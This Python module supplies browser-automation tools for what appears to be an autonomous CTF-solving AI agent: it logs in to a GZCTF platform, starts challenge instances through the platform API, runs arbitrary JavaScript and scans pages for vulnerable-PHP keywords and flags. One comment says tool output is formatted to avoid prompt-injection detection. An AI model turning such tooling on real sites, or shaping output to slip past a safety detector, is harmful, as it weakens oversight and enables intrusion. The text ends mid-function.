"""Browser automation tools using Playwright.

Gives the agent the ability to interact with web UIs:
- Navigate to URLs (with cookie support)
- Click elements, fill forms
- Extract text, links, and form fields
- Execute JavaScript
- Take screenshots
"""

from __future__ import annotations

import json
import html
import os
import re
import time
import base64
from pathlib import Path
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
import unicodedata


# Platform configuration - can be overridden via environment or settings
_platform_config: dict[str, Any] = {
    "base_url": os.environ.get("CTF_PLATFORM_URL", ""),
    "login_path": os.environ.get("CTF_LOGIN_PATH", "/account/Login"),
    "challenges_path": os.environ.get("CTF_CHALLENGES_PATH", "/games/1/challenges"),
    "username_selector": os.environ.get("CTF_USERNAME_SELECTOR", 'input[type="text"], input[name="userName"]'),
    "password_selector": os.environ.get("CTF_PASSWORD_SELECTOR", 'input[type="password"]'),
    "login_button_text": os.environ.get("CTF_LOGIN_BUTTON", "登录"),
}
_last_challenge_instance_url = ""


def configure_platform(
    base_url: str,
    login_path: str = "/account/Login",
    challenges_path: str = "/games/1/challenges",
    username_selector: str = 'input[type="text"], input[name="userName"]',
    password_selector: str = 'input[type="password"]',
    login_button_text: str = "登录",
) -> None:
    """Configure the CTF platform URLs and selectors.

    Call this before using browser tools to set up the target platform.
    """
    _platform_config.update({
        "base_url": base_url.rstrip("/"),
        "login_path": login_path,
        "challenges_path": challenges_path,
        "username_selector": username_selector,
        "password_selector": password_selector,
        "login_button_text": login_button_text,
    })


def get_platform_config() -> dict[str, Any]:
    """Get current platform configuration."""
    return _platform_config.copy()


def _get_domain(url: str) -> str:
    """Extract domain from URL."""
    parsed = urlparse(url)
    return parsed.netloc or parsed.path.split("/")[0]


def _prefer_last_instance_url(target: str) -> str:
    """Use the latest challenge instance when a probe accidentally targets the platform."""
    if not _last_challenge_instance_url:
        return target
    target = (target or "").strip()
    if not target or target == "about:blank":
        return _last_challenge_instance_url

    platform_base = (_platform_config.get("base_url") or "").strip()
    platform_host = urlparse(platform_base).netloc if platform_base else ""
    parsed = urlparse(target) if target.startswith(("http://", "https://")) else None
    target_host = parsed.netloc if parsed else ""
    if platform_host and target_host == platform_host:
        return _last_challenge_instance_url
    return target


class BrowserSession:
    """Persistent headless browser session shared across tool calls."""

    def __init__(self) -> None:
        self._playwright = None
        self._browser = None
        self._context = None
        self._page = None
        self._cookies: dict[str, str] = {}
        self._return_url: str = ""
        self._current_domain: str = ""

    @property
    def page(self):
        return self._page

    def ensure_browser(self) -> None:
        if self._page is not None:
            return
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            raise ImportError(
                "Playwright is not installed. Install with: pip install playwright && playwright install chromium"
            )
        self._playwright = sync_playwright().start()
        self._browser = self._playwright.chromium.launch(headless=True)
        self._context = self._browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        self._page = self._context.new_page()
        # Set cookies for configured domain if available
        if self._cookies and self._current_domain:
            self._apply_cookies_to_domain(self._current_domain)

    def _apply_cookies_to_domain(self, domain: str) -> None:
        """Apply stored cookies to a domain."""
        if not self._context or not self._cookies:
            return
        domain_variants = [domain, f".{domain}"]
        for d in domain_variants:
            try:
                self._context.add_cookies([
                    {"name": k, "value": v, "domain": d, "path": "/"}
                    for k, v in self._cookies.items()
                ])
            except Exception:
                pass

    def close(self) -> None:
        if self._browser:
            self._browser.close()
        if self._playwright:
            self._playwright.stop()
        self._page = None
        self._browser = None
        self._context = None
        self._playwright = None

    def set_cookie(self, name: str, value: str, domain: str = "") -> None:
        self._cookies[name] = value
        target_domain = domain or self._current_domain or _get_domain(_platform_config.get("base_url", ""))
        if self._context and target_domain:
            try:
                self._context.add_cookies([
                    {"name": name, "value": value, "domain": target_domain, "path": "/"}
                ])
            except Exception:
                pass

    def set_cookies(self, cookies: dict[str, str], domain: str = "") -> None:
        for k, v in cookies.items():
            self.set_cookie(k, v, domain)

    def set_domain(self, domain: str) -> None:
        """Set the current working domain for cookies."""
        self._current_domain = domain


# Global session (shared across tool calls in one agent run)
_session: BrowserSession | None = None


def get_session() -> BrowserSession:
    global _session
    if _session is None:
        _session = BrowserSession()
    return _session


def reset_session() -> None:
    global _session
    if _session:
        _session.close()
    _session = BrowserSession()


def _sanitize_text(value: Any, limit: int | None = None) -> str:
    text = str(value or "")
    text = unicodedata.normalize("NFKC", text)
    text = text.replace(" ", " ")
    text = "".join(ch if ch in "\n\r\t" or ord(ch) >= 32 else " " for ch in text)
    if limit is not None:
        text = text[:limit]
    return text


# ── Tool implementations ──────────────────────────────────────

def _extract_security_snippets(text: str, radius: int = 220, max_snippets: int = 12) -> list[str]:
    normalized = _sanitize_text(text)
    searchable = normalized.lower()
    keywords = [
        "class flag",
        "private $a",
        "protected $b",
        "__destruct",
        "create_function",
        "eval(",
        "$_get",
        "unserialize",
        "include(",
        "highlight_file",
        "upload.php",
        "include.php",
        "/flag",
        "flag{",
        "isctf{",
        "ctf{",
    ]
    snippets: list[str] = []
    seen: set[str] = set()
    for keyword in keywords:
        start_at = 0
        while len(snippets) < max_snippets:
            pos = searchable.find(keyword, start_at)
            if pos < 0:
                break
            start = max(0, pos - radius)
            end = min(len(normalized), pos + len(keyword) + radius)
            snippet = _sanitize_text(normalized[start:end], radius * 2 + len(keyword))
            key = re.sub(r"\s+", " ", snippet.lower()).strip()
            if key and key not in seen:
                seen.add(key)
                snippets.append(snippet)
            start_at = pos + len(keyword)
    return snippets


def _check_platform_auth(page: Any, base_url: str) -> dict[str, Any]:
    result: dict[str, Any] = {"checked": False}
    request = getattr(getattr(page, "context", None), "request", None)
    if not request or not base_url:
        return result
    profile_url = urljoin(base_url.rstrip("/") + "/", "api/account/profile")
    try:
        response = request.get(profile_url, timeout=10000)
        status = int(getattr(response, "status", 0) or 0)
        headers = getattr(response, "headers", {}) or {}
        content_type = str(headers.get("content-type", "")).lower()
        body = ""
        try:
            body = response.text()
        except Exception:
            body = ""
        ok = 200 <= status < 300 and "json" in content_type
        result.update({
            "checked": True,
            "ok": ok,
            "status": status,
            "url": profile_url,
            "content_type": content_type,
            "body_preview": _sanitize_text(body, 200),
        })
    except Exception as exc:
        result.update({"checked": True, "ok": False, "error": _sanitize_text(exc, 200), "url": profile_url})
    return result


def browser_navigate(url: str, cookies: str = "", wait_seconds: int = 3) -> str:
    """Navigate to a URL using headless browser.

    Browser maintains session cookies automatically after login.
    Use browser_fill + browser_click to login first, then navigate freely.

    Args:
        url: Full URL to navigate to
        cookies: Optional cookie string (rarely needed — browser handles auth)
        wait_seconds: Wait time in seconds after page load (default 3 for SPAs)

    Returns:
        Page title, URL, and visible text content
    """
    session = get_session()
    try:
        session.ensure_browser()

        # Tool-level deduplication: check if already on this URL
        current_url = _sanitize_text(session.page.url, 1000)
        target_normalized = url.rstrip("/").lower()
        current_normalized = current_url.rstrip("/").lower()
        if target_normalized == current_normalized or current_url.startswith(url.rstrip("/")):
            import json as _json
            return _json.dumps({
                "status": "already_on_page",
                "skipped": True,
                "url": current_url,
            }, ensure_ascii=False)

        if cookies:
            for pair in cookies.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    session.set_cookie(k.strip(), v.strip())

        session.page.goto(url, wait_until="domcontentloaded", timeout=15000)
        time.sleep(max(0, min(int(wait_seconds or 0), 2)))

        title = _sanitize_text(session.page.title(), 500)
        current_url = _sanitize_text(session.page.url, 1000)
        text = _sanitize_text(session.page.inner_text("body"), 4000)

        return (
            f"Title: {title}\n"
            f"URL: {current_url}\n"
            f"Page text:\n{text}"
        )
    except Exception as e:
        return f"Browser navigate error: {e}"


def browser_click(selector_or_text: str) -> str:
    """Click an element on the page.

    Args:
        selector_or_text: CSS selector (e.g. 'button.submit') or visible text to click

    Returns:
        New page state after click
    """
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page

        click_targets = [
            lambda: page.locator(selector_or_text).first.click(timeout=5000),
            lambda: page.get_by_role("button", name=selector_or_text, exact=False).first.click(timeout=5000),
            lambda: page.get_by_text(selector_or_text, exact=False).first.click(timeout=5000),
            lambda: page.locator(f"button:has-text({json.dumps(selector_or_text, ensure_ascii=False)})").first.click(timeout=5000),
            lambda: page.locator(f"a:has-text({json.dumps(selector_or_text, ensure_ascii=False)})").first.click(timeout=5000),
            lambda: page.locator(f"xpath=//*[contains(normalize-space(.), {json.dumps(selector_or_text, ensure_ascii=False)})]").first.click(timeout=5000),
        ]

        for click in click_targets:
            try:
                click()
                time.sleep(1)
                return (
                    f"Clicked '{selector_or_text}'\n"
                    f"Title: {_sanitize_text(page.title(), 500)}\n"
                    f"URL: {_sanitize_text(page.url, 1000)}\n"
                    f"Text: {_sanitize_text(page.inner_text('body'), 2000)}"
                )
            except Exception:
                continue

        return f"Could not find element: {selector_or_text}. Available buttons: {_list_clickable(page)}"
    except Exception as e:
        return f"Browser click error: {e}"


def browser_fill(selector: str, value: str) -> str:
    """Fill an input field.

    Args:
        selector: CSS selector for the input field (e.g. 'input[name="userName"]')
        value: Text to type into the field

    Returns:
        Confirmation message
    """
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page

        # Detect if this is the PLATFORM login page (not a challenge login form)
        is_password_field = 'password' in selector.lower() or 'type="password"' in selector.lower()
        url_lower = page.url.lower()
        # Only warn for platform login pages, not challenge pages
        is_platform_login = '/account/login' in url_lower or '/login' in url_lower and '/games/' not in url_lower

        locator = page.locator(selector).first
        if locator.count() == 0:
            return f"Input not found: {selector}"
        locator.fill(value)

        result = f"Filled '{selector}' with '{value}'"

        # Add warning only if filling platform login form manually
        if is_password_field and is_platform_login:
            result += "\n\n**WARNING**: You are manually filling the PLATFORM login form. Use browser_login tool instead - it has built-in deduplication to avoid login loops."

        return result
    except Exception as e:
        return f"Browser fill error: {e}"


def browser_extract(what: str = "all") -> str:
    """Extract content from the current page.

    Args:
        what: What to extract - 'text', 'links', 'forms', 'inputs', 'buttons', or 'all'

    Returns:
        Extracted content as formatted text
    """
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        result: list[str] = []

        if what in ("text", "all"):
            result.append(f"=== Page Text ===\n{_sanitize_text(page.inner_text('body'), 4000)}")

        if what in ("links", "all"):
            links = page.evaluate(r"""() => {
                const links = document.querySelectorAll('a[href]');
                return Array.from(links).map(a => ({
                    text: a.textContent.trim().substring(0, 80),
                    href: a.href
                }));
            }""")
            result.append(f"=== Links ({len(links)}) ===")
            for l in links[:30]:
                result.append(f"  {l['text'][:60]} -> {l['href'][:120]}")

        if what in ("forms", "inputs", "all"):
            inputs = page.evaluate(r"""() => {
                const inputs = document.querySelectorAll('input, textarea, select, button');
                return Array.from(inputs).map(el => ({
                    tag: el.tagName,
                    type: el.type || '',
                    name: el.name || '',
                    id: el.id || '',
                    placeholder: el.placeholder || '',
                    text: (el.textContent || el.value || '').trim().substring(0, 50)
                }));
            }""")
            result.append(f"=== Inputs/Buttons ({len(inputs)}) ===")
            for inp in inputs[:30]:
                result.append(
                    f"  [{inp['tag']}] name={inp['name']} id={inp['id']} "
                    f"type={inp['type']} placeholder={inp['placeholder']} text={inp['text']}"
                )

        if what in ("buttons",):
            buttons = page.evaluate(r"""() => {
                const btns = document.querySelectorAll('button, a[role=button], [type=submit], [class*=btn]');
                return Array.from(btns).map(b => b.textContent.trim().substring(0, 80));
            }""")
            result.append(f"=== Buttons ({len(buttons)}) ===")
            for b in buttons[:20]:
                result.append(f"  [{b}]")

        return "\n".join(result)
    except Exception as e:
        return f"Browser extract error: {e}"


def browser_execute(js_code: str) -> str:
    """Execute JavaScript in the browser and return the result.

    Args:
        js_code: JavaScript code to execute

    Returns:
        JSON-stringified result
    """
    session = get_session()
    try:
        session.ensure_browser()
        result = session.page.evaluate(js_code)
        return _sanitize_text(json.dumps(result, ensure_ascii=False, default=str), 12000)
    except Exception as e:
        return f"Browser JS error: {e}"


def browser_login(username: str, password: str, return_url: str = "", platform_url: str = "") -> str:
    """Log in to a CTF platform and optionally return to a page.

    Args:
        username: Login username
        password: Login password
        return_url: URL to navigate to after login (optional)
        platform_url: Base URL of the CTF platform (optional, uses configured default)

    Returns:
        Login result and page content
    """
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page

        # Tool-level deduplication: check if already logged in (more reliable than LLM instructions)
        try:
            current_text = _sanitize_text(page.inner_text("body"), 500)
            if "登出" in current_text or "退出" in current_text or "Logout" in current_text.lower():
                current_url = _sanitize_text(page.url, 500)
                import json as _json
                return _json.dumps({
                    "status": "already_logged_in",
                    "skipped": True,
                    "url": current_url,
                }, ensure_ascii=False)
        except Exception:
            pass  # Page might not be loaded yet, proceed with login

        base_url = platform_url.rstrip("/") if platform_url else _platform_config.get("base_url", "")
        if not base_url:
            return "Error: No platform URL configured. Call configure_platform() or set CTF_PLATFORM_URL env var."

        login_path = _platform_config.get("login_path", "/account/Login")
        challenges_path = _platform_config.get("challenges_path", "/games/1/challenges")
        username_selector = _platform_config.get("username_selector", 'input[type="text"]')
        password_selector = _platform_config.get("password_selector", 'input[type="password"]')
        login_button = _platform_config.get("login_button_text", "登录")

        session.set_domain(_get_domain(base_url))

        current_url = str(page.url or "")
        configured_target = f"{base_url}{challenges_path}"
        target = return_url or ""
        if not target:
            current_path = urlparse(current_url).path.rstrip("/").lower()
            generic_paths = {"", "/", "/games", login_path.rstrip("/").lower()}
            target = configured_target if current_url == "about:blank" or current_path in generic_paths else current_url
        if not target or target == "about:blank" or login_path in target:
            target = f"{base_url}{challenges_path}"

        login_url = f"{base_url}{login_path}"
        page.goto(login_url, wait_until="networkidle", timeout=30000)
        page.locator(username_selector).first.fill(username)
        page.locator(password_selector).first.fill(password)

        clicked = False
        click_errors: list[str] = []
        click_attempts = [
            lambda: page.get_by_role("button", name=login_button, exact=False).first.click(timeout=10000),
            lambda: page.locator('form button[type="submit"], button[type="submit"], input[type="submit"]').first.click(timeout=10000),
            lambda: page.locator("form button").last.click(timeout=10000),
            lambda: page.locator("button").last.click(timeout=10000),
        ]
        for click in click_attempts:
            try:
                click()
                clicked = True
                break
            except Exception as exc:
                click_errors.append(str(exc)[:160])
        if not clicked:
            return "Browser login error: could not click login button; " + " | ".join(click_errors[:3])

        page.wait_for_load_state("networkidle", timeout=30000)
        time.sleep(1)

        logged_in_text = _sanitize_text(page.inner_text("body"), 800)

        # Check login success indicators
        ui_login_success = False
        if "登出" in logged_in_text or "退出" in logged_in_text or "Logout" in logged_in_text.lower():
            ui_login_success = True
        if "请先登录" not in logged_in_text and "登录" not in page.url.lower():
            ui_login_success = True

        auth_check = _check_platform_auth(page, base_url)
        login_success = bool(auth_check.get("ok")) if auth_check.get("checked") else ui_login_success

        page.goto(target, wait_until="networkidle", timeout=30000)
        time.sleep(2)

        target_text = _sanitize_text(page.inner_text("body"), 2000)

        # Return pure data only - no instructions (avoid prompt injection detection)
        import json as _json
        return _json.dumps({
            "status": "success" if login_success else "failed",
            "logged_in": login_success,
            "url": _sanitize_text(page.url, 500),
            "title": _sanitize_text(page.title(), 200),
            "auth_check": auth_check,
            "page_preview": target_text[:800] if login_success else target_text[:1500],
        }, ensure_ascii=False)
    except Exception as e:
        return f"Browser login error: {e}"


def browser_challenge_cards() -> str:
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        cards = page.evaluate(r"""() => {
            const nodes = Array.from(document.querySelectorAll('a[href], button, [role=button], .card, [class*=card], [class*=challenge], [class*=Challenge]'));
            const seen = new Set();
            return nodes.map((el, index) => {
                const rect = el.getBoundingClientRect();
                const text = (el.innerText || el.textContent || el.getAttribute('aria-label') || '').trim().replace(/\s+/g, ' ').substring(0, 240);
                const href = el.href || el.getAttribute('href') || '';
                const onclick = el.getAttribute('onclick') || '';
                const role = el.getAttribute('role') || '';
                const classes = el.className || '';
                const item = { index, tag: el.tagName, text, href, onclick, role, classes: String(classes).substring(0, 120), visible: rect.width > 0 && rect.height > 0 };
                const key = `${item.tag}|${item.text}|${item.href}`;
                if (seen.has(key)) return null;
                seen.add(key);
                return item;
            }).filter(item => item && item.visible && (item.text || item.href || item.onclick)).slice(0, 80);
        }""")
        lines = [f"URL: {_sanitize_text(page.url, 1000)}", f"=== Clickable/challenge candidates ({len(cards)}) ==="]
        for card in cards:
            lines.append(
                f"[{card['index']}] <{card['tag']}> text={_sanitize_text(card['text'], 240)!r} href={_sanitize_text(card['href'], 400)!r} role={_sanitize_text(card['role'], 80)!r} class={_sanitize_text(card['classes'], 120)!r}"
            )
        return "\n".join(lines)
    except Exception as e:
        return f"Browser challenge cards error: {e}"


def browser_open_challenge(identifier: str) -> str:
    """Open a challenge and automatically start the instance."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        result = page.evaluate(r"""async (identifier) => {
            const norm = s => (s || '').trim().replace(/\s+/g, ' ');
            // Include mantine-Card-root and other common challenge card selectors
            const nodes = Array.from(document.querySelectorAll('a[href], button, [role=button], .card, [class*=card], [class*=Card], [class*=challenge], [class*=Challenge], [class*=mantine-Card], [class*=mantine-Paper]'));
            let target = null;
            const numeric = /^\d+$/.test(identifier) ? Number(identifier) : null;
            if (numeric !== null) target = nodes[numeric];
            if (!target) {
                target = nodes.find(el => norm(el.innerText || el.textContent || el.getAttribute('aria-label')).includes(identifier));
            }
            if (!target) {
                target = nodes.find(el => String(el.href || el.getAttribute('href') || '').includes(identifier));
            }
            if (!target) return {ok: false, reason: 'not found'};
            target.scrollIntoView({block: 'center', inline: 'center'});
            target.click();
            return {ok: true, text: norm(target.innerText || target.textContent || target.getAttribute('aria-label')), href: target.href || target.getAttribute('href') || ''};
        }""", identifier)
        time.sleep(2)

        # After opening the challenge modal, look for existing instance URL first
        instance_url = None
        start_clicked = False

        # Check if instance is already running (URL in modal)
        page_html = page.content()
        import re
        url_patterns = [
            r'http://challenge[^\s"\'<>]+',
            r'http://[a-zA-Z0-9.-]+:\d{4,5}[^\s"\'<>]*',
        ]
        for pattern in url_patterns:
            match = re.search(pattern, page_html)
            if match:
                instance_url = match.group(0)
                break

        # If no instance URL found, try to start one
        if not instance_url:
            start_selectors = [
                'button:has-text("开启")',
                'button:has-text("启动")',
                'button:has-text("创建")',
                'button:has-text("开始")',
                'button:has-text("Start")',
                'button:has-text("Create")',
            ]

            for selector in start_selectors:
                try:
                    btn = page.locator(selector)
                    if btn.count() > 0 and btn.first.is_enabled():
                        btn.first.click()
                        start_clicked = True
                        time.sleep(5)  # Wait for instance to start
                        break
                except Exception:
                    continue

            # Look for instance URL again after starting
            if start_clicked:
                page_html = page.content()
                for pattern in url_patterns:
                    match = re.search(pattern, page_html)
                    if match:
                        instance_url = match.group(0)
                        break

        return (
            f"Open challenge result: {_sanitize_text(json.dumps(result, ensure_ascii=False), 4000)}\n"
            f"Instance started: {start_clicked}\n"
            f"Instance URL: {instance_url or 'Not found - may need to wait or check page'}\n"
            f"Title: {_sanitize_text(page.title(), 500)}\n"
            f"URL: {_sanitize_text(page.url, 1000)}\n"
            f"Text: {_sanitize_text(page.inner_text('body'), 3000)}"
        )
    except Exception as e:
        return f"Browser open challenge error: {e}"


def browser_start_instance() -> str:
    """Start a challenge instance by clicking the start button in the modal.

    Call this after browser_open_challenge to actually start the challenge instance.
    Returns the instance URL if found.
    """
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page

        # Look for start/create instance button
        start_selectors = [
            'button:has-text("开启")',
            'button:has-text("启动")',
            'button:has-text("创建")',
            'button:has-text("开始")',
            'button:has-text("Start")',
            'button:has-text("Create")',
        ]

        clicked = False
        for selector in start_selectors:
            try:
                btn = page.locator(selector)
                if btn.count() > 0:
                    btn.first.click()
                    clicked = True
                    break
            except Exception:
                continue

        if not clicked:
            return "No start instance button found. The challenge may not have a dynamic instance."

        # Wait for instance to start
        time.sleep(5)

        # Look for instance URL in the page
        page_text = page.inner_text('body')
        page_html = page.content()

        import re
        # Look for challenge instance URLs (typically http://challenge.xxx:port or similar)
        url_patterns = [
            r'http://challenge[^\s<>"\']+',
            r'http://[a-zA-Z0-9.-]+:\d{4,5}[^\s<>"\']*',
            r'nc\s+[a-zA-Z0-9.-]+\s+\d+',
        ]

        instance_url = None
        for pattern in url_patterns:
            match = re.search(pattern, page_html)
            if match:
                instance_url = match.group(0)
                break

        result = {
            "status": "instance_started" if clicked else "no_button_found",
            "instance_url": instance_url,
            "page_text": _sanitize_text(page_text, 2000),
        }

        return json.dumps(result, ensure_ascii=False, indent=2)

    except Exception as e:
        return f"Browser start instance error: {e}"


def browser_page_state() -> str:
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        state = page.evaluate(r"""() => {
            const bodyText = document.body ? document.body.innerText : '';
            const isLoggedIn = bodyText.includes('登出') || bodyText.includes('退出') || bodyText.toLowerCase().includes('logout');
            const needsLogin = bodyText.includes('请先登录') || bodyText.includes('请登录') || location.href.toLowerCase().includes('login');
            return {
                url: location.href,
                title: document.title,
                login_status: isLoggedIn ? 'LOGGED_IN' : (needsLogin ? 'NEEDS_LOGIN' : 'UNKNOWN'),
                text: bodyText.substring(0, 3000),
                links: Array.from(document.querySelectorAll('a[href]')).slice(0, 40).map((a, index) => ({index, text: a.innerText.trim().replace(/\s+/g, ' ').substring(0, 120), href: a.href})),
                buttons: Array.from(document.querySelectorAll('button, [role=button], input[type=submit]')).slice(0, 40).map((b, index) => ({index, text: (b.innerText || b.value || b.getAttribute('aria-label') || '').trim().replace(/\s+/g, ' ').substring(0, 120)})),
                inputs: Array.from(document.querySelectorAll('input, textarea, select')).slice(0, 40).map((el, index) => ({index, tag: el.tagName, type: el.type || '', name: el.name || '', id: el.id || '', placeholder: el.placeholder || '', value: el.value || ''}))
            };
        }""")
        try:
            source_signals = _extract_security_snippets(page.inner_text("body"))
            if source_signals:
                state["source_signals"] = source_signals
        except Exception:
            pass
        return _sanitize_text(json.dumps(state, ensure_ascii=False, indent=2), 12000)
    except Exception as e:
        return f"Browser page state error: {e}"


def browser_gzctf_start_web_challenge(
    game_id: str | int = "",
    challenge_title: str = "",
    category: str = "Web",
    prefer: str = "most_solved",
    challenge_id: str | int = "",
) -> str:
    """Select a GZCTF challenge via API and start its dynamic instance."""
    global _last_challenge_instance_url
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        platform_base = (_platform_config.get("base_url") or "").rstrip("/")
        if not platform_base:
            parsed = urlparse(page.url or "")
            if parsed.scheme and parsed.netloc:
                platform_base = f"{parsed.scheme}://{parsed.netloc}"
        if not platform_base:
            return json.dumps({"status": "error", "error": "missing platform base URL"}, ensure_ascii=False)

        request = page.context.request

        def api_get(path: str):
            return request.get(urljoin(platform_base + "/", path.lstrip("/")), timeout=20000)

        def api_post(path: str):
            return request.post(urljoin(platform_base + "/", path.lstrip("/")), timeout=30000)

        def read_json(response) -> dict[str, Any]:
            try:
                data = response.json()
            except Exception:
                text = response.text() if hasattr(response, "text") else ""
                return {"_error": "non_json_response", "_text": _sanitize_text(text, 1000)}
            return data if isinstance(data, dict) else {"data": data}

        def response_error(response, action: str) -> dict[str, Any] | None:
            status = getattr(response, "status", 0)
            if 200 <= int(status) < 300:
                return None
            body = ""
            try:
                body = response.text()
            except Exception:
                body = ""
            return {
                "status": "error",
                "action": action,
                "http_status": status,
                "error": _sanitize_text(body, 1000),
            }

        selected_game: dict[str, Any] | None = None
        details: dict[str, Any] | None = None
        category_name = category or "Web"

        requested_game = str(game_id or "").strip()
        if not requested_game:
            for game_source in (page.url or "", _platform_config.get("challenges_path", "")):
                match = re.search(r"/games/(\d+)", str(game_source))
                if match:
                    requested_game = match.group(1)
                    break

        if requested_game:
            game_response = api_get(f"/api/game/{requested_game}")
            error = response_error(game_response, "get_game")
            if error:
                return json.dumps(error, ensure_ascii=False)
            selected_game = read_json(game_response)

            details_response = api_get(f"/api/game/{requested_game}/details")
            error = response_error(details_response, "get_game_details")
            if error:
                return json.dumps(error, ensure_ascii=False)
            details = read_json(details_response)
        else:
            games_response = api_get("/api/game?count=30&skip=0")
            error = response_error(games_response, "list_games")
            if error:
                return json.dumps(error, ensure_ascii=False)
            games_data = read_json(games_response)
            games = games_data.get("data", [])
            if not isinstance(games, list):
                games = []
            for game in games:
                if not isinstance(game, dict) or not game.get("id"):
                    continue
                details_response = api_get(f"/api/game/{game['id']}/details")
                if getattr(details_response, "status", 0) != 200:
                    continue
                possible_details = read_json(details_response)
                challenges = possible_details.get("challenges", {})
                if isinstance(challenges, dict) and challenges.get(category_name):
                    selected_game = game
                    details = possible_details
                    requested_game = str(game["id"])
                    break

        if not selected_game or not details:
            return json.dumps({
                "status": "error",
                "error": f"no accessible game with {category_name} challenges found",
            }, ensure_ascii=False)

        challenges_by_category = details.get("challenges", {})
        candidates = []
        if isinstance(challenges_by_category, dict):
            raw_candidates = challenges_by_category.get(category_name) or []
            if not raw_candidates and category_name.lower() != "web":
                raw_candidates = challenges_by_category.get("Web") or []
            candidates = [item for item in raw_candidates if isinstance(item, dict)]

        if not candidates:
            return json.dumps({
                "status": "error",
                "game": selected_game,
                "error": f"game has no {category_name} challenges",
            }, ensure_ascii=False, default=str)

        def candidate_summary(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
            return [
                {
                    "id": item.get("id"),
                    "title": item.get("title"),
                    "score": item.get("score"),
                    "solved": item.get("solved"),
                }
                for item in items[:12]
            ]

        selected_challenge = None
        requested_challenge_id = str(challenge_id or "").strip()
        selection: dict[str, Any] = {
            "requested_game_id": requested_game,
            "requested_challenge_id": requested_challenge_id,
            "requested_challenge_title": challenge_title or "",
            "prefer": prefer or "most_solved",
        }

        if requested_challenge_id:
            for item in candidates:
                if str(item.get("id") or "").strip() == requested_challenge_id:
                    selected_challenge = item
                    selection["matched_by"] = "challenge_id"
                    break
            if selected_challenge is None:
                return json.dumps({
                    "status": "error",
                    "error": "challenge_not_found",
                    "requested": {
                        "game_id": requested_game,
                        "challenge_id": requested_challenge_id,
                        "challenge_title": challenge_title or "",
                        "category": category_name,
                    },
                    "candidates": candidate_summary(candidates),
                }, ensure_ascii=False, default=str)

        title_query = _sanitize_text(challenge_title or "").strip().casefold()
        if selected_challenge is None and title_query:
            for item in candidates:
                title = _sanitize_text(item.get("title", "")).strip().casefold()
                if title == title_query:
                    selected_challenge = item
                    selection["matched_by"] = "title_exact"
                    break
            if selected_challenge is None:
                for item in candidates:
                    title = _sanitize_text(item.get("title", "")).strip().casefold()
                    if title_query in title:
                        selected_challenge = item
                        selection["matched_by"] = "title_substring"
                        break

        if selected_challenge is None:
            prefer_mode = (prefer or "most_solved").lower()
            if prefer_mode == "exact":
                return json.dumps({
                    "status": "error",
                    "error": "challenge_not_found",
                    "requested": {
                        "game_id": requested_game,
                        "challenge_id": requested_challenge_id,
                        "challenge_title": challenge_title or "",
                        "category": category_name,
                    },
                    "candidates": candidate_summary(candidates),
                }, ensure_ascii=False, default=str)
            if prefer_mode == "first":
                selected_challenge = candidates[0]
                selection["matched_by"] = "first"
            else:
                selected_challenge = sorted(
                    candidates,
                    key=lambda item: (
                        -int(item.get("solved") or 0),
                        int(item.get("score") or 0),
                        str(item.get("title") or ""),
                    ),
                )[0]
                selection["matched_by"] = "most_solved"

        challenge_id = selected_challenge.get("id")
        challenge_response = api_get(f"/api/game/{requested_game}/challenges/{challenge_id}")
        error = response_error(challenge_response, "get_challenge")
        if error:
            return json.dumps(error, ensure_ascii=False)
        challenge_detail = read_json(challenge_response)

        context = challenge_detail.get("context", {}) if isinstance(challenge_detail, dict) else {}
        if not isinstance(context, dict):
            context = {}
        entry = str(context.get("instanceEntry") or "").strip()
        start_response_data: dict[str, Any] | None = None

        challenge_type = str(challenge_detail.get("type") or selected_challenge.get("type") or "")
        category_label = str(challenge_detail.get("category") or selected_challenge.get("category", category_name))
        if not entry and "container" in challenge_type.lower():
            start_response = api_post(f"/api/game/{requested_game}/container/{challenge_id}")
            error = response_error(start_response, "start_container")
            if error:
                return json.dumps(error, ensure_ascii=False)
            start_response_data = read_json(start_response)
            entry = str(start_response_data.get("entry") or "").strip()
            if not entry:
                refreshed = api_get(f"/api/game/{requested_game}/challenges/{challenge_id}")
                if getattr(refreshed, "status", 0) == 200:
                    refreshed_detail = read_json(refreshed)
                    refreshed_context = refreshed_detail.get("context", {})
                    if isinstance(refreshed_context, dict):
                        challenge_detail = refreshed_detail
                        context = refreshed_context
                        entry = str(context.get("instanceEntry") or "").strip()

        instance_url = ""
        initial_http: dict[str, Any] = {}
        tcp_probe: dict[str, Any] = {}
        flag_candidates: list[str] = []
        if entry:
            instance_url = entry if entry.startswith(("http://", "https://")) else f"http://{entry}"
            _last_challenge_instance_url = instance_url
            if category_label.lower() != "pwn":
                try:
                    if hasattr(page, "goto"):
                        page.goto(instance_url, wait_until="domcontentloaded", timeout=30000)
                        time.sleep(1)
                except Exception:
                    pass
            parsed_entry = urlparse(instance_url)
            if parsed_entry.hostname and parsed_entry.port:
                try:
                    import socket

                    with socket.create_connection((parsed_entry.hostname, parsed_entry.port), timeout=3.0):
                        tcp_probe = {
                            "host": parsed_entry.hostname,
                            "port": parsed_entry.port,
                            "connected": True,
                        }
                except Exception as exc:
                    tcp_probe = {
                        "host": parsed_entry.hostname,
                        "port": parsed_entry.port,
                        "connected": False,
                        "error": _sanitize_text(exc, 200),
                    }
            try:
                if category_label.lower() == "pwn":
                    initial_http = {
                        "url": instance_url,
                        "skipped": True,
                        "reason": "raw_tcp_pwn_challenge",
                    }
                else:
                    initial_response = request.get(instance_url, timeout=10000)
                    content_type = initial_response.headers.get("content-type", "")
                    initial_http = {
                        "url": instance_url,
                        "http_status": initial_response.status,
                        "content_type": content_type,
                        "headers": _interesting_headers(initial_response.headers),
                    }
                    if _looks_textual(content_type):
                        text = initial_response.text()
                        initial_flags = _extract_flag_candidates(text)
                        initial_http["flag_candidates"] = initial_flags
